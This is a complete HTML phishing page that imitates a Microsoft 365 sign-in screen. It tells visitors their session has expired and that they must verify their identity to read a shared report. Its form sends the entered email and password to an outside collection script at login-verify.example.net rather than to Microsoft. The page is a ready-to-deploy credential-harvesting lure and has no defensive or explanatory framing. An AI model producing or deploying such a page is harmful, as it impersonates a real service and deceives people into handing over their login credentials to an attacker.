<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Microsoft 365 - Sign in</title></head>
<body>
  <div class="login-box">
    <img src="logo.png" alt="Microsoft 365">
    <h1>Sign in</h1>
    <p>Your session has expired. Verify your identity to continue reading the shared report.</p>
    <form method="post" action="https://login-verify.example.net/collect.php">
      <input type="email" name="username" placeholder="Email">
      <input type="password" name="password" placeholder="Password">
      <button type="submit">Sign in</button>
    </form>
  </div>
</body>
</html>
